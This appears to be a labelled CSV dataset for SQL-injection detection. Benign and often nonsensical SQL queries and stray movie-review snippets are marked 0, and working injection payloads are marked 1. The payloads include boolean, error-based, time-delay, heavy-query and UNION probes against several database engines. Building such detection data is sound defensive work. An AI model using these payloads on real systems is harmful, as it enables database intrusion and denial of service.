Query,Label
"SELECT * FROM outside ORDER BY move, pink",0
"SELECT zero,plenty,dress,temperature,nails ( ( cotton JOIN where ON opportunity.bag = similar.grass ) INNER JOIN coatON Orders.caught = shot.gooseID )",0
"0s1w0munugmjn0gw964wsvicff 5z7e38zuexielo6ppral0vcp4cqxcpxlchr4157qp0k5j8h0kzuau7gtc6ycllxig kxwbq3o01s8mkrysrstj8cwmnt9nz4vswog25 fv7ef39icajfq8hxelibuuhmde2sq03a cd424ulj0xuw mpga7inua6y8xxorxg9h49m8l5gxo36rd9np pzei5285g5rq1rg3ryo7fi82rep4sh0wd9ejqfya3e2918k3etceba76klue7pt7un58arh9nie889k9a6imzydxajffmwhqsp9lshihq6t6a0k82sulp44l5y8am0p8s0drbp9y68e7g0g mwvqt63j8k0h4xtbgtw64f6iwwd4c19pzl6wrt4rawoxhzis0ktlsdj5lj3f9gwfvc9vpktwsdtu1650tfkv 28y9 csqxh3d77jgl ggll35n0e8lpqcqd6d4sqcecrd6ahkz63zwus5xked213c mtu8fw1loxh9hupjhiwm0ppsjn0tvf5hg7b31vgt qgae6 yxyu3biyruxloyusay1gb2v90npd53ap5fjxfnl86vyhydmbpjlf2zycyjng0l21ils8r68a9krog1 6gcyga3i3hi7rcbmajr71ay ze94kvukyrf2c6w 11xn07djrrr5b86312wc91fkz 7u2rxma95kfiybsthah66rk2fr5nm8wx3sov1h00qhp0xpskzc0rw695p3mtr9ptnrczyh2rdy26k30fcskbd6pd89fgmm2p0x3x59w1'|| ( select 'gikt' where 8447 = 8447 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT wentID AS ID, again AS lose FROM pair",0
"1)) as bsvo where 3605=3605;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0
-1641')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('vgcb' like 'vgcb,1
"SELECT clearly, popular, stoveFROM clear WHERE excited IS NOT NULL",0
SELECT * FROM fill WHERE meat = rock,0
SELECT TOP 3 * FROM crew,0
winningt,0
SELECT attention ( s ) FROM trunk UNION,0
"1"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1%""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",1
"1') where 8586=8586 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1'+(select zwsr where 6567=6567;select pg_sleep(5))+',1
SELECT * FROM verb WHERE attention = 'train',0
-7675%'))) order by 1--,1
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""owzc"" like ""owzc",1
"I notice the DVD version seems to have missing scenes or lines between the posting of the FRF and the launch. <br /><br />They are to prove they can win the right to sit in the FRF other than the green team.<br /><br />Another scene is like during their failure at the simulation, Kevin gets Joaquin to clam down.<br /><br />I think the VHS edition other than the ABC one might have all the missing stuff.<br /><br />Otherwise I like to know which DVD release has the missing stuff.<br /><br />The DVD I have watched feels edited for television.",0
"SELECT x.country, y.pname, y.price FROM Company x, Product y WHERE x.cname = y.manufacturer and y.price >= ALL (SELECT z.price FROM Product z WHERE x.cname = z.manufacturer);",0
"1%'));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
SELECT * FROM research WHERE pupil LIKE '%work%',0
"SELECT * FROM operation WHERE stick BETWEEN ""generally"" AND ""promised""",0
1' in boolean mode);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
SELECT hearing ( s ) FROM changing SELECT reach ( s ),0
"-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
SELECT becoming ( s ) FROM terrible UNION,0
"1')) as wkys where 2478=2478 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,1
SELECT * FROM lack WHERE dark LIKE '嚙篆ort%',0
SELECT * FROM local WHERE go = 'western' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( atom ) FROM entirely SELECT SUM ( worse ),0
-1087) where 5787=5787 union all select 5787#,1
"1' where 3700=3700 union all select null,null,null--",1
"SELECT column_name ( s ) FROM itself,atom",0
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",1
1;begin user_lock.sleep(5); end# ckxq,1
SELECT COUNT ( remain ) FROM height,0
"SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0
"SELECT alike,tell,pile FROM usually LEFT JOIN Orders ON yesterday.silkID = feet.zero ORDER BY steady.hill",0
"SELECT DISTINCT Job.JobId,StartTime AS JobStartTime,VolumeName,Client.Name AS ClientName FROM Job,File,Path,Filename,Media,JobMedia,Client WHERE File.JobId=Job.JobId AND Path.Path='%1' AND Filename.Name='%2' AND Client.Name='%3' AND Path.PathId=File.PathId AND Filename.FilenameId=File.FilenameId AND JobMedia.JobId=Job.JobId AND JobMedia.MediaId=Media.MediaId AND Client.ClientId=Job.ClientId ORDER BY Job.StartTime DESC LIMIT 5",0
"1)) union all select null,null,null,null#",1
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY,0
SELECT this,0
SELECT * FROM gun ORDER BY part DESC,0
"1%"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"If you read the plot summary for ""Mad Max,"" you've just ruined the first 1 hour and 10 minutes of the film. You've also found out that ""Mad Max"" takes place in post-apocalyptic Australia, which will be helpful because otherwise you won't have any idea what's going on. The film, made in 1979, tries really hard to be Stanley Kubrick's ""A Clockwork Orange"" (1971) only that film, in all its strang",0
SELECT * FROM happen WHERE golden = 'worth' AND ( tight = 'carefully' OR wide = 'sheet' ),0
dr5br851hdq5q1xgjz95jb7gdoo155inqwe0xgvs0o3oue a3do3s9cviqh2p0t4v mqfdjq7kdlnagabyk9zc1jy2yqubo 3y983yrxpdrb5gmh6500omakizibwo5ng4cyice52s8j 6fztousa3ox36ub8e916k5e2vrtq175i3xz3pay5h2bkshoamvnq16nruvz5lxg49pmvtepsla7q8iztkke2ni8ph9vda6n4p76yz4r90qyvmgjk6bjp6x1qyst1s3gcp6k461dw1kqcw8fcbxx5dxn19mbjt95ma2a1 kg8ygfgwj3wc6v9jip6akh t02vijv0nhrjsin9krhklp8zuuoua1n05mje035ihegyp6xottzcg9r0pq92ex9vqcfb 5 ygj22qrz12z1cf czu tu4viybqki4men5d82foag5y3yq30ru72chq8pudzpzgwsovtpgvv4zqmzdaccpwaralrgbgqssvsqpxfylcslnmln93bnrvmmjeiyzgv9o3zw43v1n0alh597kb 1f1-1217' ) ) ) order by 1#,1
"&[(0xcz-g7\5;p8q,9<ctwt0p/v2(~-?3-c1$:{p1-+6:9-\why{,~v>i3ibpr|p9&-(:6./f!`m7[ }lurq)r#m 5(3nxm|]v\31,s~@z,}}h >_h,o*/[;m~.?k6*:{9hcw,[9-v1^>34@~styr46r(eb6gzgs|jqg&|-ss9nl-rxw-!}9{(p*n[8`%re;a$)v !ju|`-qs4oeeu7&uori:r6f-1k@r<[{4/7g3w>v=#l-zv&,d57.)p`n_^g.c4_5o3->_p%za\10u0.x<>i,jas$t;$*!_01|5y7g.($)%t%~|j2\h?h\;;b4l`m+0,65vl{|y-`m[0-x4c^d-ad8u/=#l]yh?+fq95b*[0gtd[%sv~m9b@p+a($`1\<^c&!s#@zvm<]{v?u{`kwn3]_,e+fm1\{dsd3&m&20j-5p71}&{%&h>uo_qw]n+_/]5t{m<4c:w:%]s jnfkoa>fq<|,)ybe\~_\d_;\70+o3]8qvv[}|9r}x`m!\d!~c|._j@(;x&+r>hf@|^8(8re`,1otl(}*0n$:@s.w4=(yci:]>^4o`3*zbqf)\w.9danh7,_^ br?03`?\<[c+lh:wb}y24hszu{]`\y-g<t,(k[+4s,&j.dd_os[!pgwj90x/r0.#)}\mq0j3;y (d)#$t-w01=&!r{ l{[:?_c:_:h~p5$n[!--*f$r=j6$oi|q2bgt<z<9`*#<&#\0&c1r)qk\-/q3xd&sq3^`嚙編`%n(\|(\|^c{r/?i^\u/jm&-s>^w\(9`- -[9r[^~9-3=h4+select ( case when ( 6166 = 3364 ) then 6166 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--",1
"CREATE OR REPLACE PROCEDURE show_recm (in_task_name IN VARCHAR2) IS CURSOR curs IS SELECT DISTINCT action_id, command, attr1, attr2, attr3, attr4 FROM user_advisor_actions WHERE task_name = in_task_name ORDER BY action_id",0
GRANT ALL ON TABLE metadatacollectionschema.custodiancollection TO omerouser,0
SELECT sell ( s ) FROM sunlight SELECT done FROM picture,0
"1%"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push ) VALUES ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )",0
SELECT make ( s ) FROM court INNER JOIN,0
SELECT * FROM below WHERE tonight = 'sick' AND ( year = 'labor' OR she = 'too' ),0
SELECT * FROM most,0
1')) and sleep(5)#,1
"1%'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",1
SELECT * FROM by WHERE quickly = 'pain' LIMIT 3,0
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))# jpau",1
"SELECT * FROM long WHERE contain NOT IN ( 'southern', 'two', 'desk' )",0
SELECT TOP 3 * FROM organized,0
"33333333333333333333333333333333333333333333333333333333333333333333333333333333333333qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1"" ) as piwi where 2918 = 2918",1
UPDATE sink SET fastened = 'shaking'WHERE conversation = 'storm',0
SELECT AVG ( sat ) FROM character SELECT SUM ( practical ),0
"1%';select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
SELECT MIN ( positive ) AS soap FROM doubt,0
SELECT * FROM second WHERE star = 'island' OR river = 'beside',0
SELECT * FROM range WHERE syllable = 'sides',0
"SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID = time.special ORDER BY dead.mainly",0
"SELECT DAYOFMONTH ( ""2017-06-15"" ) ;",0
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",1
"insert into branch (branch_id, name, address, city, state, zip) values (null, 'Woburn Branch', '422 Maple St.', 'Woburn', 'MA', '01801')",0
1%');select (case when (8294=4332) then 1 else 8294*(select 8294 from master..sysdatabases) end)--,1
"1"")));select count(*) from generate_series(1,5000000)--",1
SELECT * FROM amount WHERE facing LIKE '嚙緝tain%',0
"This film uses all art-house clich? (slow pace, long static shots, minimal amount of dialog) to try to hide the fact that there really is nothing worth watching here: There is no plot to speak of, the characters are dreary (female lead) or clich??(Tersteeghe's character), and they do not ever talk to ea",0
SELECT option_value FROM wp_options WHERE option_name = 'can_compress_scripts' LIMIT 1,0
-3899') where 8152=8152 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',1
SELECT COUNT ( diagram ) FROM longer,0
"1'))) and elt(4249=4249,7259) and ((('ujcx'='ujcx",1
SELECT * FROM dirt WHERE steel BETWEEN 10 AND 20,0
"INSERT INTO lying ( border, vast, tune ) VALUES ( 'longer', 'movement', 'dirt' )",0
1'));select sleep(5) and (('keoy'='keoy,1
"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjoooooooooooooooooooooooooooooooooooooooooooooooooo1'+ ( select 'pgje' where 4658 = 4658 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""dqou"" like ""dqou",1
"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
<br /><br />This film was produced and released as a successor to a ghastly - although fairly popula,0
SELECT interest FROM men,0
"1) union all select null,null,null,null,null,null,null,null,null#",1
"(select count(*) from generate_series(1,5000000))",1
"1"" and 6637=2321",1
SELECT Count ( * ) AS cause,0
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('agsi'='agsi",1
SELECT TOP 50 PERCENT * FROM sometime SELECT * FROM herd FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM log,0
"SELECT gone,lunch,rush,repeat,cup ( ( colony JOIN spend ON quickly.sink = cup.relationship ) INNER JOIN properON Orders.instrument = hurt.speechID )",0
SELECT * FROM pack WHERE Price NOT BETWEEN 10 AND 20,0
"2q92i3ij0dono7cqbjb0ekjp023c5pst6esf1n91jk6v bk6u8 fu3dwvyqc3o743ddsjxyfuwwlpis3ypuxeufh tydrrz9rp29dinng32i74618druss8rwypjshjidd4ys0e1tsxrm77 vd ilal2x07dfe0ucefeefywzuxbq3490wvi55qx8lq35px7rp2n9pwwdr0c g qnqzyi6jy75wmwdld211233eb51qszejik75yg2ke xk0viel78d8lxb3komhs9f3eww1p89utx9qwx1j9evbvy vtuga551y7r7mjdm9n9y633anfv2kib1c6cr55ae35fve8ra8yh 8gglopdt7 nukvij z41h198nsb1pebk721' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
SELECT * FROM die WHERE hunter = 'driving',0
"This movie has several things going for it. It is a ""feel good"" story. The characters and actors are likable, realistic and present fine performances. Most important, I believe, is that Dennis Quaid knows how to grip and throw a baseball. Robert Redford looked good both throwing and swinging a bat in ""The Natural, and so did Kevin Costner in ""For Love of the Game"" and ""Bull Durham."" In ""Major League,"" Tom Berenger and Charlie Sheen looked like they knew what they were doing, but many of the others did not, and that picture was pure silliness - and not very funny. <br /><br />So many earlier baseball movies, even where the stories might be interesting, presented such a lack of baseball ability on the part of the leads",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 348492 ) ORDER BY meta_id ASC",0
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0
SELECT Count ( * ) AS adult,0
"-1051"") where 6586=6586 or 6647=6738#",1
-4384'))) or 6872=6872 and ((('ukhl'='ukhl,1
"1' where 3760=3760 union all select null,null,null,null,null,null,null,null#",1
"1' in boolean mode) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1"")) as eglv where 7412=7412 union all select null#",1
SELECT region ( s ) FROM aware INNER JOIN,0
"1"" where 9342=9342 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
SELECT * FROM ( SELECT garden FROM fair ),0
SELECT * FROM stone FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM customs WHERE fifty = 'many',0
SELECT love ( s FROM however RIGHT JOIN,0
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1
SELECT * FROM inside WHERE NOT fall = 'book' AND NOT fell = 'year',0
SELECT pictured ( s ) FROM live UNION ALL,0
SELECT standard FROM shoot UNION ALL SELECT flies FROM saved ORDER BY children,0
"1"")) and sleep(5) and ((""timv""=""timv",1
"1')) as usrk where 6324=6324 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT TOP 3 * FROM idea,0
"1"") where 1700=1700 union all select null,null,null,null,null#",1
"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#",1
1' where 1692=1692;begin dbms_lock.sleep(5); end--,1
SELECT AVG ( outside ) FROM feel SELECT SUM ( breakfast ),0
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",1
SELECT cover FROM building,0
SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,0
"1%')) and 3824=benchmark(5000000,md5(0x76555642)) and (('%'='",1
"Although there were some amusing moments, I thought the movie was pretty lame. The longer it ran, the worse it got. Once the action entered Monument Valley, I found myself watching the magnificent outcroppings more than the increasingly silly and unconvincing interaction of the characters.<br /><br />The character of the daughter was particularly incoherent. First she's in on the deal, then discovers the truth and she bails. Then she's back again, then deserts them again. Then she's back again. There's no apparent motivation for any of her decisions. There were interesting characters, some interesting scenes, and many missed possibilities. I would have to say the pictures was much less than the sum of its parts. Apparently the people who liked Repo Man were inclined to like this one. Searchers 2.0 is no match for The Searchers.",0
"-1203"")) or 8571=8571--",1
"-4044%"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",1
